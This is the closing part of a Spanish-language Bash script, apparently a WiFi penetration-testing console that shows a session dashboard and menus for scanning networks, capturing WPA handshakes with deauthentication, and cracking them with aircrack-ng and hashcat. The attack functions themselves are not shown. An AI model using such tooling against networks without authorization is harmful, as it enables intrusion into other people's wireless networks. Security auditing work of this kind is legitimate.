                    err "Valor inválido. Usa entero >= 10."
                fi
                pause
                ;;
            6)
                AUTHORIZED_SESSION=0
                ok "Autorización de sesión reiniciada."
                pause
                ;;
            0)
                return
                ;;
            *)
                err "Opción inválida."
                pause
                ;;
        esac
    done
}

# Badge de capacidad: verde si disponible, gris si no.
cap_badge() {
    local flag="$1" name="$2"
    if (( flag == 1 )); then
        printf "%b●%b %s  " "$GREEN" "$RESET" "$name"
    else
        printf "%b○%b %b%s%b  " "$DARK_GREY" "$RESET" "$DIM" "$name" "$RESET"
    fi
}

dashboard() {
    local iface_type iface_badge
    iface_type="$(get_iface_type)"
    [[ -z "$iface_type" || "$iface_type" == "N/A" ]] && iface_type="desconocido"
    if [[ "$iface_type" == "monitor" ]]; then
        iface_badge="${GREEN}● monitor${RESET}"
    elif [[ "$INTERFACE" == "N/A" || -z "$INTERFACE" ]]; then
        iface_badge="${RED}○ sin interfaz${RESET}"
    else
        iface_badge="${YELLOW}● ${iface_type}${RESET}"
    fi

    section "Estado de la sesión"
    printf "  %-14s %s  [%b]\n" "Interfaz:" "${INTERFACE:-N/A}" "$iface_badge"
    printf "  %-14s %s\n" "Canal/Freq:" "$(get_iface_channel) / $(get_iface_frequency)"

    local ncap nrep nhash
    ncap=$(find "$CAPTURE_DIR" -maxdepth 1 -name '*.cap' 2>/dev/null | grep -c .)
    nrep=$(find "$REPORT_DIR" -maxdepth 1 \( -name '*.txt' -o -name '*.md' \) 2>/dev/null | grep -c .)
    nhash=$(find "$HASH_DIR" -maxdepth 1 -name '*.22000' 2>/dev/null | grep -c .)
    printf "  %-14s %s capturas · %s reportes · %s hashes 22000\n" "Artefactos:" "$ncap" "$nrep" "$nhash"

    printf "  %-14s " "Capacidades:"
    cap_badge "$HAS_TSHARK" "tshark"
    cap_badge "$HAS_HCXTOOLS" "hcxtools"
    cap_badge "$HAS_HASHCAT" "hashcat"
    cap_badge "$HAS_CRUNCH" "crunch"
    echo ""

    section "Objetivo actual"
    if [[ -n "$TARGET_BSSID" ]]; then
        local enc; enc="$(encr_label "$TARGET_PRIVACY" "$TARGET_AUTH")"
        printf "  %b%s%b   %b%s%b\n" "$BOLD$GREEN" "${TARGET_SSID:-<hidden>}" "$RESET" "$(encr_color "$enc")" "$enc" "$RESET"
        printf "  %-10s %s   %-8s %s   %-7s %s\n" "BSSID:" "$TARGET_BSSID" "Canal:" "$TARGET_CHANNEL" "Señal:" "$(power_meter "$TARGET_POWER")"
    else
        warn "No hay objetivo seleccionado — empieza por escanear (opción 1)."
    fi
}

main_menu() {
    while true; do
        title "CONSOLA PRINCIPAL"
        dashboard

        section "RECON"
        echo -e "  ${CYAN}1.${RESET} Escanear redes y seleccionar objetivo"
        echo -e "  ${CYAN}2.${RESET} Ver información completa del objetivo"

        section "CAPTURA"
        echo -e "  ${CYAN}3.${RESET} Captura de handshake / deauth autorizado"

        section "CRACKING"
        echo -e "  ${CYAN}4.${RESET} Verificar handshake en CAP"
        echo -e "  ${CYAN}5.${RESET} Validar CAP con diccionario (aircrack-ng)"
        echo -e "  ${CYAN}6.${RESET} Hashcat — convertir a 22000 y crackear (GPU)"
        echo -e "  ${CYAN}7.${RESET} Gestor de diccionarios"

        section "GESTIÓN"
        echo -e "  ${CYAN}8.${RESET} Capturas, reportes y hashes"
        echo -e "  ${CYAN}9.${RESET} Configuración / interfaz / restaurar WiFi"
        echo -e "  ${RED}0.${RESET} Salir"

        echo ""
        local opt
        read -r -p "Selecciona opción: " opt

        case "$opt" in
            1) scan_networks ;;
            2) show_target_info ;;
            3) capture_menu ;;
            4) verify_handshake ;;
            5) dictionary_attack ;;
            6) hashcat_menu ;;
            7) wordlist_manager ;;
            8) list_artifacts ;;
            9) settings_menu ;;
            0)
                cleanup_all
                clear_screen
                exit 0
                ;;
            *)
                err "Opción inválida."
                pause
                ;;
        esac
    done
}

main() {
    parse_args "$@"
    splash_screen
    title "INICIALIZANDO CSH SECURITY TOOLKIT"

    section "Validaciones"
    require_bash
    require_root
    require_deps

    mkdir -p "$CAPTURE_DIR" "$REPORT_DIR" "$WORDLIST_DIR" "$HASH_DIR"

    if [[ -n "$INTERFACE" ]] && ! interface_exists "$INTERFACE"; then
        warn "La interfaz '$INTERFACE' no existe. Se abrirá el selector."
        INTERFACE=""
    fi

    select_interface 0 || exit 1

    ok "Entorno listo"
    pause

    main_menu
}

main "$@"
